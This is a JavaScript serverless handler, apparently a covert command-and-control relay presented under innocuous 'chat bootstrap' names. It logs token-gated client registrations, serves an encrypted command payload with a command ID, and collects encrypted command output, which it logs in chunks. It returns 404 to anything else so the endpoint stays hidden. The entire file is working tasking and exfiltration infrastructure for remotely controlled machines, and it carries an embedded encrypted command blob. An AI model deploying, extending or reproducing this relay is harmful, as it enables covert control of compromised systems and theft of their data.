import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '1002';
const CONTROL_PAYLOAD = 'U2FsdGVkX19ZPIwBendGctxOXQC8aVcQ9qDGMetGH8m+xY9HsBmPoNXLYpFCR/hVWw7twj6+rokLq8WV+F4axQuRIWTA6Wjw3XDVybxG8BdKELTiRnEpgqA3P+EpC8a637u4EAywlUI+lOFAxKLoArh/8MiU8emOu+kli/ljVPs6X311HfpFXt5+WunaXE20HDqpVSVzWBYCqkD6dAInm3r4MVRNRkNBwKr8Ft6ZmXzr+HxW8ZOaJatw3CJV0y4ioKNRNy0gvDwDeMUdpikBi4EIo1RIgGbqWJU1Ggp2bT+rx3YRSmVfuYhddxEZQe9e4jHKp+4PGBBe67Vg30fl+dKou9ZKhLyIHxvEy5+wPs2dMs9qRE445dId0JrgqgzdQ0UkjQdS83Et3jjR4IyyvMnjw7EDQy9vz+wawuQ0Iet5cmOEU3VVoWHk/bfrkhZzTQKJgAOf5kk1j4PkKgMc6t4SEIgX2zaQy8B18AOx4EjE6q/c5RcAgWysxYEEZjetaBReNrutOIO4CxhKDa2AIx7iV9zU43/31NNsgiOuu2nJuqJ1S6TtSKcih5iU5zzdqvfcIddpNoWyVlYz8xdzCFEncn/r3HshOnSMG9j4hxN/i40EN4+tBwv6qGiBR22K3nQbQQNsMqUO4fpiUtoD53rmFkXxgW+wDn4PsufK5vTRn8kZfeCJsV1Tw+9zDppDIz+b9NEQRIoE57ObVvvZcbf3voe5DiLrMNsh7wI9DG8GcK8cRYJ46eIndwg8vxlVm2afU9z9p9VZ0azPmTDx7j+vpIh/A9VfL3MWlW3/bxd1Y6mwpoGV9ey4bM26LpvivkhPw9R7yRHlzawl6kkZAiAtbopvuWFgZhtENFO8Enf9/knlbQvOP1iAvvBJFlQqR/Lq5l0PsSB6wKt5i8xHtih78SFP5vrmk/Q29xAkOFC3BgqIYwfgRWauh692XM0il/scJvl8aOc6DcVUiQWkD7r8u4dl0cZnP/eg7x2LYcLljvVw2aTvYDFPUDW4eXTEJXB2NgTPcn9AJnW8mSVst6q1uqKPNKTA1neUT99jclE4AU/71p334EL/a5gm83xO9d2cVOwAgAhZS6nKfeVrIHoy+2vIzPzqyEw9lcjj0dQeJ/SbXlP4QLAXFz1sIV4PlelmDZViClP+fj06IYHiuaok3m5XVP/pikLKzkT6SWBOgJ0Law0qNe1V5KFDvSBdprOLY3xR//yFEeHH+PtcbZCjRiycg0Kb/YFo+pwzV1OV8vjngbdtakn2V7tepGrwaJo5wBWmS70Fd4m12Llb4jg+wtSicsIAz5gjO80kmpZPQtTx+8l8W64OMXCyJMwNu6O09/Xlminylik9AgCqxXlH+M/l1zZq7glrUgK8GZEbrxFtHhvFe57pOMmGvBF9LzKxdowvAMIyKsEerOwsUmbs1FkUhI6ikLqnb0kTCfX7bc+Xy3Q9n4AY1IgJLrwgxT8AE6lbwQoUNy5JJb4+72BuuWjFjDjhHhxDle9YmOkYhKv4BtSzO9u6xlnoQTshVUvS9KhCgdWgDk3+hhImWZgrWuowaCGIby4NTzeP0Rq084zB+KaYJy/0uViIp/FV2N6G2reBmmmClf0iZcCLuotrnQ3d9Mbt8zl9dXjs3Ug8VPW06zg/A+TK4sXz0gcHCQP3idgoVyWhuW4xcTHtfi4gGVe3vpYirPHubQrSWcMX1zqN9jGEscFWw9vGaY1goBx75pXPCHweTBbAw/R3BK+MrDFeopeLhDHN8+4SzPZSFpg5U8MiGTvv6KRbfL6q';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
